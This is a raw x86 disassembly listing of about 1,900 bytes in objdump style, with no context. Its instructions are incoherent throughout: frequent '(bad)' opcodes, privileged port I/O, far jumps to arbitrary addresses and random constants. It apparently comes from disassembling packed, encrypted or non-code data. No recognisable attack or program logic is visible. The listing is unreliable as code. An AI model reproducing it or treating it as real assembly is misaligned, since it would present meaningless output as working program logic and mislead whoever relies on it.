  416ee1:	int    0xf7
  416ee3:	stos   BYTE PTR es:[edi],al
  416ee4:	mov    al,ds:0x6abed029
  416ee9:	inc    edx
  416eea:	push   eax
  416eeb:	fsubr  st,st(1)
  416eed:	pop    ebx
  416eee:	pop    ebx
  416eef:	je     0x416ea0
  416ef1:	cmp    ah,bl
  416ef3:	mov    ds:0x7abdd4e8,eax
  416ef8:	dec    esi
  416ef9:	jae    0x416f61
  416efb:	daa    
  416efc:	pusha  
  416efd:	push   ecx
  416efe:	out    0xf4,al
  416f00:	pop    esp
  416f01:	in     eax,0x99
  416f03:	sub    edi,edi
  416f05:	lds    ebx,FWORD PTR [ecx+0x3b9ac3f]
  416f0b:	adc    edi,ebx
  416f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f0e:	jns    0x416f3f
  416f10:	call   0xf82c37b1
  416f15:	pop    ecx
  416f16:	pop    edi
  416f17:	inc    edx
  416f18:	retf   0xbae4
  416f1b:	lods   eax,DWORD PTR ds:[esi]
  416f1c:	add    al,0xf1
  416f1e:	lahf   
  416f1f:	and    eax,0xef2db22c
  416f24:	add    dh,al
  416f26:	inc    esp
  416f27:	and    BYTE PTR [edi-0x7f177abf],ch
  416f2d:	gs mov esp,0xd1e709af
  416f33:	xchg   esi,eax
  416f34:	push   0xfffffffe
  416f36:	leave  
  416f37:	xchg   esp,eax
  416f38:	push   ebp
  416f39:	test   al,0xf4
  416f3b:	dec    esi
  416f3c:	(bad)  
  416f3d:	retf   0x50c9
  416f40:	retf   
  416f41:	xor    DWORD PTR [ecx+0x1],edi
  416f44:	push   cs
  416f45:	add    esp,DWORD PTR [ecx]
  416f47:	mov    al,0x2e
  416f49:	cdq    
  416f4a:	sub    cl,0xef
  416f4d:	pop    edi
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	cwde   
  416f6b:	sub    BYTE PTR [eax+0x7f193792],bl
  416f71:	jo     0x416f2c
  416f73:	jle    0x416fe5
  416f75:	jo     0x416f4f
  416f77:	cmp    dl,BYTE PTR [eax+0x61]
  416f7a:	sar    BYTE PTR [ecx+edi*8-0x1b04ba33],cl
  416f81:	push   ds
  416f82:	js     0x416ffb
  416f84:	cmp    DWORD PTR [eax],esp
  416f86:	mov    edi,0x3246cb1
  416f8b:	pop    esi
  416f8c:	sub    ecx,DWORD PTR [ebx-0x3361568c]
  416f92:	mov    BYTE PTR [esi-0x69013535],dl
  416f98:	xor    dl,BYTE PTR [edx]
  416f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f9b:	arpl   WORD PTR [ebx+0x6b0aff91],si
  416fa1:	dec    edi
  416fa2:	sub    BYTE PTR [esp+ebp*1+0x3],dh
  416fa6:	aam    0xcd
  416fa8:	jp     0x416f41
  416faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fab:	sti    
  416fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fad:	cmc    
  416fae:	nop
  416faf:	popf   
  416fb0:	xor    ch,BYTE PTR [edi+0x22]
  416fb3:	cmp    eax,0x6e23edae
  416fb8:	iret   
  416fb9:	call   0x801df19e
  416fbe:	fnstsw WORD PTR [eax]
  416fc0:	out    dx,al
  416fc1:	push   0x11
  416fc3:	ror    BYTE PTR [ebp-0x44],1
  416fc6:	mov    WORD PTR [eax+0x68],?
  416fc9:	ror    DWORD PTR [esi],cl
  416fcb:	push   edx
  416fcc:	jae    0x416fbc
  416fce:	clc    
  416fcf:	mov    ch,al
  416fd1:	shl    BYTE PTR [eax],1
  416fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd4:	inc    ecx
  416fd5:	lods   al,BYTE PTR ds:[esi]
  416fd6:	bnd jmp 0xc0ff6d99
  416fdc:	inc    esp
  416fdd:	push   edi
  416fde:	mov    esi,0xcab29bad
  416fe3:	jg     0x3537d503
  416fe9:	pop    ebx
  416fea:	repnz push ebx
  416fec:	push   esp
  416fed:	ss mov ecx,gs
  416ff0:	test   BYTE PTR fs:[esi],cl
  416ff3:	xchg   ebp,eax
  416ff4:	adc    BYTE PTR [esi],al
  416ff6:	dec    eax
  416ff7:	pop    ebp
  416ff8:	lea    edi,[ebp-0x4253b426]
  416ffe:	mov    cl,0xba
  417000:	nop
  417001:	hlt    
  417002:	add    al,0x7b
  417004:	mov    eax,0x5d68c693
  417009:	fiadd  WORD PTR [ebx+eiz*2+0x7c020cd7]
  417010:	je     0x41708a
  417012:	rcr    DWORD PTR [ecx-0x49],1
  417015:	pop    edx
  417016:	mov    ds:0x4c00388d,al
  41701b:	(bad)  
  41701c:	pushf  
  41701d:	xchg   al,al
  41701f:	and    al,0x30
  417021:	lahf   
  417022:	pop    ss
  417023:	sbb    al,0x92
  417025:	loopne 0x41705f
  417027:	pop    ds
  417028:	mov    BYTE PTR [ebp-0x71],ch
  41702b:	push   eax
  41702c:	test   eax,0x178e8716
  417031:	xor    ecx,ebp
  417033:	je     0x417033
  417035:	mov    cl,0xae
  417037:	sbb    bl,BYTE PTR [edx+0x682d004b]
  41703d:	and    al,0xdb
  41703f:	(bad)  
  417040:	ss popa 
  417042:	ficomp DWORD PTR [esi-0x3d9fa126]
  417048:	daa    
  417049:	test   DWORD PTR [eax-0x4a],edx
  41704c:	mov    bh,0x4f
  41704e:	adc    eax,0xb513b009
  417053:	fwait
  417054:	mov    cl,0x7b
  417056:	pop    ss
  417057:	push   eax
  417058:	and    ebx,DWORD PTR [esi]
  41705a:	sub    al,0x14
  41705c:	adc    cl,bl
  41705e:	cmp    bh,BYTE PTR [edi+0x26]
  417061:	add    al,0x9f
  417063:	jg     0x417024
  417065:	mov    edx,0xfb38d106
  41706a:	neg    BYTE PTR [edx+ebp*8-0x8]
  41706e:	ds mov esp,0xe0636ab4
  417074:	xor    al,ah
  417076:	ins    BYTE PTR es:[edi],dx
  417077:	sub    BYTE PTR [ecx-0x349d2a83],dl
  41707d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41707e:	mov    dh,0x7d
  417080:	add    al,0x94
  417082:	int3   
  417083:	mov    esp,0x94a792f8
  417088:	repz adc al,BYTE PTR es:[ebx]
  41708c:	push   0xffffff8b
  41708e:	pop    ebp
  41708f:	mov    edi,0xc87054eb
  417094:	inc    edi
  417095:	int    0x1b
  417097:	sub    ecx,DWORD PTR [edx-0x6e]
  41709a:	and    DWORD PTR [edx+0x5db6c1d7],ecx
  4170a0:	jo     0x41711b
  4170a2:	cld    
  4170a3:	cmc    
  4170a4:	sbb    eax,0x376c4da5
  4170a9:	pop    edx
  4170aa:	mov    bl,0xd6
  4170ac:	aad    0x4d
  4170ae:	or     BYTE PTR [edx+0x3a26f9e6],dh
  4170b4:	imul   esi,DWORD PTR [edx],0x5c
  4170b7:	xchg   BYTE PTR [ebp+0x67f75ef9],al
  4170bd:	inc    esi
  4170be:	ja     0x417090
  4170c0:	repnz mov ds:0x3fdb40ac,al
  4170c6:	adc    ch,BYTE PTR [ecx]
  4170c8:	push   0x418bac51
  4170cd:	into   
  4170ce:	(bad)  [edx-0x54ef196d]
  4170d4:	xor    dl,ch
  4170d6:	(bad)  
  4170d7:	inc    ecx
  4170d8:	adc    BYTE PTR [edx+0x1a],dl
  4170db:	jae    0x41709f
  4170dd:	add    al,0xa0
  4170df:	adc    eax,0xf5da2580
  4170e4:	popa   
  4170e5:	cld    
  4170e6:	pop    ebp
  4170e7:	push   ebx
  4170e8:	(bad)  
  4170e9:	dec    ecx
  4170ea:	or     al,0x24
  4170ec:	xchg   esp,eax
  4170ed:	jae    0x4170b9
  4170ef:	repnz sub ch,BYTE PTR [ecx+0x29a6a6b1]
  4170f6:	mov    esi,0xc20552ee
  4170fb:	mov    eax,0x6f7d74a9
  417100:	jmp    0x4170a4
  417102:	iret   
  417103:	push   edi
  417104:	repz mov bh,0xb1
  417107:	inc    eax
  417108:	addr16 aaa 
  41710a:	mov    dl,0xd0
  41710c:	(bad)  
  41710d:	sti    
  41710e:	jmp    0x417144
  417110:	xchg   esi,eax
  417111:	js     0x41711e
  417113:	cwde   
  417114:	mov    eax,ds:0x7236fc55
  417119:	inc    edi
  41711a:	or     ah,BYTE PTR [edi-0x39]
  41711d:	loop   0x41712f
  41711f:	xchg   BYTE PTR [edi],bl
  417121:	jne    0x417159
  417123:	and    eax,0xe48dcc4e
  417128:	xor    BYTE PTR [ecx+0x7f],dh
  41712b:	pop    esi
  41712c:	push   edi
  41712d:	lock retf 
  41712f:	pop    eax
  417130:	push   0xabcc14f1
  417135:	xor    al,0x6b
  417137:	fisub  DWORD PTR [edi+0xf56bb31]
  41713d:	jg     0x417171
  41713f:	outs   dx,DWORD PTR ds:[esi]
  417140:	or     BYTE PTR [ebx-0x6eac56db],0xc8
  417147:	fnstsw WORD PTR [ecx]
  417149:	push   eax
  41714a:	or     bl,ch
  41714c:	(bad)  
  41714e:	pop    eax
  41714f:	sbb    BYTE PTR ds:0x1f6d9ae2,ch
  417155:	call   0x26e4b024
  41715a:	das    
  41715b:	aaa    
  41715c:	add    BYTE PTR [ebx-0x10],bh
  41715f:	push   ebp
  417160:	jge    0x41716d
  417162:	cmp    eax,0x9bc9054
  417167:	lahf   
  417168:	cli    
  417169:	adc    eax,0x61c6c955
  41716e:	xchg   esi,eax
  41716f:	mov    ecx,ss
  417171:	inc    ebx
  417172:	mov    al,ds:0xbb9136bd
  417177:	cld    
  417178:	mov    al,0x62
  41717a:	xlat   BYTE PTR ds:[ebx]
  41717b:	push   edx
  41717c:	sahf   
  41717d:	push   ebp
  41717e:	and    al,0x8d
  417180:	jns    0x4171c6
  417182:	jmp    0x85466968
  417187:	test   eax,0x18cd32d
  41718c:	in     al,0xdd
  41718e:	sub    BYTE PTR [ebp+0x39],0x33
  417192:	aam    0x2b
  417194:	jb     0x41720f
  417196:	js     0x4171cb
  417198:	jle    0x41717c
  41719a:	xor    edi,DWORD PTR [ebp+0x76]
  41719d:	aas    
  41719e:	mov    esi,0x68564aef
  4171a3:	rol    BYTE PTR [edx-0x55c57db8],1
  4171a9:	je     0x41713d
  4171ab:	les    edx,FWORD PTR [esp+ebp*1-0x77]
  4171af:	jns    0x4171a5
  4171b1:	dec    eax
  4171b2:	push   es
  4171b3:	adc    DWORD PTR [ebx-0x7265a44e],ecx
  4171b9:	or     DWORD PTR [eiz*4-0x534e0ee2],edi
  4171c0:	xor    DWORD PTR ds:0x734dbe7e,esi
  4171c6:	mov    eax,0x5aaaa25f
  4171cb:	mov    DWORD PTR [edi-0x38],edx
  4171ce:	or     DWORD PTR [ebx],ebx
  4171d0:	iret   
  4171d1:	arpl   WORD PTR [eax],ax
  4171d3:	mov    esp,0xe96e6866
  4171d8:	push   eax
  4171d9:	imul   esi,DWORD PTR [esi],0x83d2e2c8
  4171df:	and    edi,ebx
  4171e1:	mov    eax,ds:0xbfcb5079
  4171e6:	sbb    eax,DWORD PTR [edx+0x33]
  4171e9:	mov    esp,0x66e022b0
  4171ee:	popa   
  4171ef:	ins    DWORD PTR es:[edi],dx
  4171f0:	sub    ebx,DWORD PTR [ecx+0x35]
  4171f3:	fwait
  4171f4:	inc    esp
  4171f5:	sub    eax,0x140f505
  4171fa:	gs cmp ecx,eax
  4171fd:	int3   
  4171fe:	mov    BYTE PTR [esi],al
  417200:	scas   al,BYTE PTR es:[edi]
  417201:	outs   dx,BYTE PTR ds:[esi]
  417202:	repnz mov eax,ds:0x70a5a355
  417208:	push   ebp
  417209:	scas   eax,DWORD PTR es:[edi]
  41720a:	pop    ds
  41720b:	add    al,0xb6
  41720d:	sbb    DWORD PTR [ebx],edx
  41720f:	out    dx,eax
  417210:	cdq    
  417211:	sbb    BYTE PTR [eax],cl
  417213:	inc    edi
  417214:	add    DWORD PTR [esi+0x22],edi
  417217:	cmp    ebx,esp
  417219:	inc    edx
  41721a:	or     BYTE PTR [edx+0x1a],dl
  41721d:	mov    bh,0xc8
  41721f:	or     al,0x5a
  417221:	dec    esp
  417222:	or     ecx,DWORD PTR [esp+ebp*8]
  417225:	call   0xbdd8323c
  41722a:	arpl   sp,bp
  41722c:	lock aaa 
  41722e:	pop    ss
  41722f:	inc    edi
  417230:	cli    
  417231:	lock repnz adc ch,cl
  417235:	mov    eax,0x155e5deb
  41723a:	lods   eax,DWORD PTR ds:[esi]
  41723b:	pop    ebp
  41723c:	add    BYTE PTR [edx+0x43],cl
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	sbb    DWORD PTR [edx+0x26704e56],eax
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x4f70707e
  417261:	outs   dx,DWORD PTR ds:[esi]
  417262:	cld    
  417263:	shr    edi,1
  417265:	mov    dl,0x53
  417267:	push   ebx
  417268:	ja     0x417251
  41726a:	xchg   ebp,esi
  41726c:	fstp   DWORD PTR [esp+eax*1]
  41726f:	(bad)  
  417270:	push   esi
  417271:	dec    ebx
  417272:	adc    edx,ecx
  417274:	call   0x459a:0x30e6d0dc
  41727b:	adc    BYTE PTR [ebx+0x7],dl
  41727e:	push   ss
  41727f:	test   al,0x2a
  417281:	mov    ecx,0xaa140149
  417286:	add    eax,0xcb83db63
  41728b:	or     esp,DWORD PTR [ecx+edi*1+0x1f]
  41728f:	add    DWORD PTR [ecx-0x1fcb64d8],ebx
  417295:	stc    
  417296:	pop    ebx
  417297:	retf   
  417298:	xor    eax,0x77c55342
  41729d:	mov    ecx,0x9d52c0c1
  4172a2:	push   edx
  4172a3:	mov    DWORD PTR [ebx-0x3a],edx
  4172a6:	sbb    eax,0xc4b413af
  4172ab:	(bad)  
  4172ac:	fwait
  4172ad:	imul   eax,DWORD PTR [edx],0xffffffde
  4172b0:	ret    0x90d5
  4172b3:	sti    
  4172b4:	jecxz  0x41724f
  4172b6:	inc    eax
  4172b7:	int3   
  4172b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b9:	dec    eax
  4172ba:	push   edi
  4172bb:	sub    eax,DWORD PTR [edi]
  4172bd:	jecxz  0x4172a7
  4172bf:	add    ah,BYTE PTR [edx+0x14f9df46]
  4172c5:	pop    esi
  4172c6:	jnp    0x417281
  4172c8:	int3   
  4172c9:	and    ecx,DWORD PTR [esi]
  4172cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172cc:	xchg   esi,eax
  4172cd:	xchg   BYTE PTR [esi],ch
  4172cf:	push   ecx
  4172d0:	pop    ss
  4172d1:	lods   al,BYTE PTR fs:[esi]
  4172d3:	adc    eax,0x1dbfdc0f
  4172d8:	fisttp WORD PTR [edx+0x18f640d6]
  4172de:	sbb    bl,BYTE PTR [edx+0x5a]
  4172e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172e2:	lods   eax,DWORD PTR ds:[esi]
  4172e3:	jle    0x4172ff
  4172e5:	mov    ebp,0x4bca4fbc
  4172ea:	mov    dh,0xb8
  4172ec:	lods   eax,DWORD PTR ds:[si]
  4172ee:	cli    
  4172ef:	inc    ebx
  4172f0:	sub    BYTE PTR [edi+ecx*1+0x930745c],dh
  4172f7:	push   es
  4172f8:	into   
  4172f9:	cld    
  4172fa:	add    BYTE PTR [eax],ch
  4172fc:	xchg   ebx,eax
  4172fd:	test   BYTE PTR ds:0x4733ca61,0x96
  417304:	les    ebx,FWORD PTR [edi]
  417306:	mov    al,0xe3
  417308:	cmp    DWORD PTR [edx+0x1a],ebp
  41730b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730c:	repnz sahf 
  41730e:	push   ebp
  41730f:	mov    bh,0x1b
  417311:	ds scas eax,DWORD PTR es:[edi]
  417313:	add    DWORD PTR [ebp+edx*8+0x2e6b7479],0xffffffd3
  41731b:	fisub  DWORD PTR [ecx]
  41731d:	bound  ebp,QWORD PTR [ecx+0x7a8d831a]
  417323:	mov    ebx,DWORD PTR [edx-0x33]
  417326:	xchg   DWORD PTR [ebp+0xb56d055],ebp
  41732c:	pop    ebp
  41732d:	test   DWORD PTR [edi-0x38bb0961],esp
  417333:	lea    esi,ds:0x8a2035c2
  417339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41733a:	stos   DWORD PTR es:[edi],eax
  41733b:	mov    ah,BYTE PTR [ebx+0x61]
  41733e:	in     eax,dx
  41733f:	xchg   edx,eax
  417340:	jns    0x4172c9
  417342:	mov    es:0x1149054d,eax
  417348:	or     DWORD PTR [ecx+0x13f8f0a3],esi
  41734e:	jmp    0x417337
  417350:	cdq    
  417351:	cmp    edx,DWORD PTR [esp+ebx*1+0x5d841dd9]
  417358:	dec    esp
  417359:	mov    edi,0x86a0011d
  41735e:	pop    ecx
  41735f:	and    al,0x2b
  417361:	mov    esi,0xd3aca82b
  417366:	mov    ds:0xb3a2b2cc,al
  41736b:	scas   al,BYTE PTR es:[edi]
  41736c:	mov    cl,0xda
  41736e:	pop    ecx
  41736f:	call   0x8401307a
  417374:	and    DWORD PTR [ebx],esi
  417376:	ficom  WORD PTR [ebx]
  417378:	mov    ds:0x2933d792,eax
  41737d:	xchg   esp,eax
  41737e:	xchg   ebp,eax
  41737f:	mov    eax,ds:0x7bfcea49
  417384:	mov    bh,0x8e
  417386:	push   ebx
  417387:	aas    
  417388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417389:	int    0x4c
  41738b:	or     cl,cl
  41738d:	ret    0x88e9
  417390:	jmp    0xf5dd:0x4c25fb60
  417397:	mov    dl,0xff
  417399:	aas    
  41739a:	pop    ss
  41739b:	jbe    0x41733d
  41739d:	mov    edi,0x3bf00ea6
  4173a2:	jle    0x41733a
  4173a4:	shl    cl,0xd8
  4173a7:	xchg   edi,eax
  4173a8:	or     al,0x13
  4173aa:	or     DWORD PTR [ebx+0x4f],0x4b6e5c26
  4173b1:	cmp    DWORD PTR [esi],edx
  4173b3:	aam    0x5e
  4173b5:	dec    esp
  4173b6:	xchg   ah,ah
  4173b8:	sbb    eax,0xc1d52e3a
  4173bd:	ud1    edx,DWORD PTR ds:0x42e59558
  4173c4:	dec    eax
  4173c5:	(bad)  
  4173c8:	mov    ch,0x4f
  4173ca:	fsub   DWORD PTR [eax]
  4173cc:	mov    ebp,0x9a9cbe47
  4173d1:	mov    dl,0x43
  4173d3:	add    edi,eax
  4173d5:	rcl    ah,1
  4173d7:	gs es adc eax,0x26047ce8
  4173de:	dec    edi
  4173df:	dec    esi
  4173e0:	and    BYTE PTR [ecx-0x1f086144],cl
  4173e6:	cmp    BYTE PTR [ecx-0x62145617],al
  4173ec:	ficom  DWORD PTR [esi+0x3]
  4173ef:	or     al,0x89
  4173f1:	inc    ecx
  4173f2:	stos   BYTE PTR es:[edi],al
  4173f3:	mov    esp,edx
  4173f5:	xor    al,0x2a
  4173f7:	pusha  
  4173f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f9:	jbe    0x4173fa
  4173fb:	loop   0x4173b0
  4173fd:	xor    ebp,DWORD PTR [edx+0x39]
  417400:	imul   edi,DWORD PTR ss:[ebp+eiz*8-0x5c],0x85b3a876
  417409:	addr16 mov cl,al
  41740c:	loop   0x4173a0
  41740e:	pop    edx
  41740f:	(bad)  
  417410:	out    dx,eax
  417411:	mov    ds:0xd51b6d51,eax
  417416:	fwait
  417417:	xchg   ebp,eax
  417418:	inc    ebx
  417419:	and    ch,BYTE PTR ds:0xc43dbacd
  41741f:	add    DWORD PTR [esi],ebp
  417421:	gs in  eax,0xf8
  417424:	(bad)  
  417426:	mov    bl,0xcc
  417428:	pop    es
  417429:	jg     0x417457
  41742b:	mov    eax,ds:0x1c780de7
  417430:	fxrstor [ecx]
  417433:	mov    esi,gs
  417435:	pop    ebx
  417436:	inc    esp
  417437:	inc    esi
  417438:	lahf   
  417439:	aaa    
  41743a:	outs   dx,DWORD PTR ds:[esi]
  41743b:	dec    ebp
  41743c:	in     eax,0x3a
  41743e:	loope  0x4173f4
  417440:	cmp    al,0xb2
  417442:	push   ebx
  417443:	xchg   DWORD PTR [ebx],esp
  417445:	rcl    esi,1
  417447:	ret    0x5249
  41744a:	in     eax,dx
  41744b:	in     al,dx
  41744c:	xor    dl,ah
  41744e:	fld    DWORD PTR [edi]
  417450:	mov    ebp,0xe8d72e3a
  417455:	in     al,dx
  417456:	(bad)  
  417457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417458:	sub    ch,bh
  41745a:	sub    bl,BYTE PTR [eax+0x58]
  41745d:	mov    ebp,0xe69eae4
  417462:	push   edx
  417463:	dec    edx
  417464:	sbb    BYTE PTR [esi+0x51ff3754],cl
  41746a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41746b:	pop    esp
  41746c:	lods   eax,DWORD PTR ds:[esi]
  41746d:	mov    al,0x63
  41746f:	mov    ebx,0x245ecf0c
  417474:	into   
  417475:	repz mov al,ds:0x20e05499
  41747b:	jnp    0x4174ad
  41747d:	loopne 0x41749e
  41747f:	jo     0x4174ea
  417481:	js     0x4174b2
  417483:	pmullw mm0,mm5
  417486:	jg     0x41748e
  417488:	ins    DWORD PTR es:[edi],dx
  417489:	lds    ebx,FWORD PTR [ecx]
  41748b:	mov    esp,eax
  41748d:	test   DWORD PTR [esi+0x2ada4de0],ecx
  417493:	std    
  417494:	gs faddp st(6),st
  417497:	sahf   
  417498:	push   edi
  417499:	iret   
  41749a:	nop
  41749b:	inc    edx
  41749c:	or     al,0xbf
  41749e:	out    dx,eax
  41749f:	retf   
  4174a0:	jge    0x417457
  4174a2:	xor    eax,0x74b2ddb8
  4174a7:	push   ebp
  4174a8:	pusha  
  4174a9:	ret    0xcf8c
  4174ac:	jle    0x41751f
  4174ae:	mov    edx,0x96587fc9
  4174b3:	sub    eax,0x3ec12c09
  4174b8:	mov    cl,dl
  4174ba:	sbb    BYTE PTR [edx],ch
  4174bc:	mov    ds:0x4aa66129,eax
  4174c1:	icebp  
  4174c2:	repnz dec esp
  4174c4:	inc    esi
  4174c5:	cdq    
  4174c6:	lahf   
  4174c7:	sbb    esi,edx
  4174c9:	sbb    al,0xaf
  4174cb:	xor    DWORD PTR [ebx],ecx
  4174cd:	test   BYTE PTR cs:[ecx+0x637e1627],dl
  4174d4:	(bad)  
  4174d5:	and    bl,BYTE PTR [esi-0x1c]
  4174d8:	rcr    BYTE PTR [esi],1
  4174da:	ret    0x6db3
  4174dd:	mov    ebp,DWORD PTR [esi-0x691a9723]
  4174e3:	mov    cl,0x82
  4174e5:	pop    edx
  4174e6:	inc    ebp
  4174e7:	cdq    
  4174e8:	arpl   WORD PTR [ebx+0x6a317c5a],dx
  4174ee:	mov    es,WORD PTR [edi]
  4174f0:	dec    edx
  4174f1:	xchg   ebp,eax
  4174f2:	push   eax
  4174f3:	(bad)  
  4174f4:	adc    edi,DWORD PTR [ebx-0x7f]
  4174f7:	idiv   ecx
  4174f9:	es push ds
  4174fb:	push   cs
  4174fc:	aaa    
  4174fd:	and    ebp,DWORD PTR [ecx+ebx*1]
  417500:	mov    edi,0xea642f28
  417505:	sahf   
  417506:	daa    
  417507:	xor    al,0x7d
  417509:	dec    esi
  41750a:	div    BYTE PTR [eax+0x2881435a]
  417510:	test   al,0xd2
  417512:	jle    0x417504
  417514:	jmp    0x3321fc3b
  417519:	sub    ch,ah
  41751b:	test   eax,0xe2019b12
  417520:	fsubr  QWORD PTR [ecx]
  417522:	push   ss
  417523:	nop
  417524:	ja     0x4174bc
  417526:	ss xor edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [ebp+0x7e],edi
  417544:	pop    edi
  417545:	dec    ecx
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x41753d
  41754f:	jmp    0x417553
  417551:	mov    ebp,0x27ace5f4
  417556:	retf   
  417557:	sbb    ebp,DWORD PTR [edi+0x31ac1924]
  41755d:	gs out dx,eax
  41755f:	mov    al,0xc0
  417561:	bound  edi,QWORD PTR [edi]
  417563:	(bad)  
  417564:	adc    DWORD PTR [edx+edx*1],ebp
  417567:	and    al,0x87
  417569:	ret    
  41756a:	xchg   ecx,eax
  41756b:	sbb    al,0x1e
  41756d:	lods   eax,DWORD PTR ds:[esi]
  41756e:	inc    eax
  41756f:	xchg   esp,eax
  417570:	push   ss
  417571:	push   0xa
  417573:	mov    dl,0x99
  417575:	sbb    al,0xc2
  417577:	pop    ds
  417578:	test   al,0x71
  41757a:	add    al,0x7f
  41757c:	test   eax,0x6e4e073
  417581:	adc    DWORD PTR [ecx],edi
  417583:	add    al,0xc
  417585:	adc    al,al
  417587:	dec    esp
  417588:	pop    esi
  417589:	inc    esp
  41758a:	fisttp DWORD PTR [ebp-0x73]
  41758d:	push   ss
  41758e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41758f:	out    dx,al
  417590:	je     0x417546
  417592:	add    edi,DWORD PTR [eax+ebp*8+0x136c85d0]
  417599:	push   esi
  41759a:	lods   al,BYTE PTR ds:[esi]
  41759b:	xor    bh,BYTE PTR [ecx-0x52538586]
  4175a1:	mul    BYTE PTR [esi-0x6]
  4175a4:	pop    ebx
  4175a5:	ss int 0x95
  4175a8:	rol    DWORD PTR [esi+0x30],cl
  4175ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175ac:	jne    0x41756d
  4175ae:	xor    dh,BYTE PTR [edi+0x60df1639]
  4175b4:	pop    ss
  4175b5:	xor    al,al
  4175b7:	stos   BYTE PTR es:[edi],al
  4175b8:	fisttp WORD PTR [edi+0x5d1aefd4]
  4175be:	div    BYTE PTR [esi+0x2fee3802]
  4175c4:	adc    dl,BYTE PTR [ecx]
  4175c6:	ds call 0x94f4aeba
  4175cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175cd:	xchg   ecx,eax
  4175ce:	inc    ebx
  4175cf:	(bad)  
  4175d0:	sbb    esi,DWORD PTR [edi+eiz*1+0x16c68b82]
  4175d7:	jno    0x417640
  4175d9:	lock dec esp
  4175db:	cmp    BYTE PTR [ecx],bh
  4175dd:	shl    DWORD PTR [ebx-0x6943f8cd],cl
  4175e3:	sub    edi,DWORD PTR [eax]
  4175e5:	sbb    DWORD PTR [eax],edi
  4175e7:	pop    edi
  4175e8:	or     al,0xb2
  4175ea:	out    0x23,eax
  4175ec:	dec    ebp
  4175ed:	jnp    0x417600
  4175ef:	(bad)  
  4175f0:	sub    eax,0xf81219cc
  4175f5:	push   cs
  4175f6:	pop    ebx
  4175f7:	retf   0x5d6
  4175fa:	jnp    0x417606
  4175fc:	(bad)  
  4175fd:	or     eax,0x4b149cc3
  417602:	push   ebp
  417603:	cmp    al,0x80
  417605:	out    dx,eax
  417606:	mov    al,ds:0xe9ded467
  41760b:	stc    
  41760c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41760d:	push   0xffffffb0
  41760f:	sbb    al,BYTE PTR [esi+0x20]
  417612:	pusha  
  417613:	lds    esp,FWORD PTR [ecx]
  417615:	inc    esp
  417616:	sbb    WORD PTR [esp+0x7a4ffcf3],bp
  41761e:	pop    ebp
  41761f:	sbb    BYTE PTR [ebx-0x7fe97434],bl
  417625:	inc    ebx
  417626:	add    eax,DWORD PTR [ecx]
  417628:	shl    DWORD PTR [ecx+0x47],1
  41762b:	push   ds
  41762c:	in     al,dx
  41762d:	mov    DWORD PTR [edx+ecx*8+0x75],edx
  417631:	mov    ebx,0x75a0fc35
  417636:	mov    bh,0xf2
  417638:	stos   DWORD PTR es:[edi],eax
  417639:	mov    DWORD PTR [edx-0xbe82ed1],ebp
  41763f:	pop    esi
  417640:	jb     0x41760a
  417642:	mov    esi,0x941efa5a
  417647:	cwde   
  417648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417649:	push   ecx
  41764a:	daa    
  41764b:	lahf   
  41764c:	push   ds
  41764d:	iret   
  41764e:	sahf   
  41764f:	test   al,0xfe
  417651:	add    esp,DWORD PTR [esp+ebp*2+0x504bbeed]
  417658:	enter  0xc1a8,0xe6
  41765c:	push   edx
  41765d:	call   0x7a3c704b
  417662:	out    dx,eax
  417663:	inc    edx
  417664:	push   es
  417665:	std    
  417666:	push   0x4726a1ab
  41766b:	sub    DWORD PTR [ebp-0x7d],0x4a
  41766f:	sbb    al,0x17
  417671:	ss mov ah,0xaf
  417674:	ret    
  417675:	mov    dh,0xb4
  417677:	hlt    
  417678:	lods   eax,DWORD PTR ds:[esi]
  417679:	push   es
  41767a:	xchg   ebp,eax
  41767b:	lea    ecx,[ebx+ebx*4]
  41767e:	adc    eax,DWORD PTR [esi]
  417680:	and    ah,ah
  417682:	push   edx
  417683:	inc    ebx
  417684:	enter  0x91d,0xd9
  417688:	lods   eax,DWORD PTR ds:[esi]
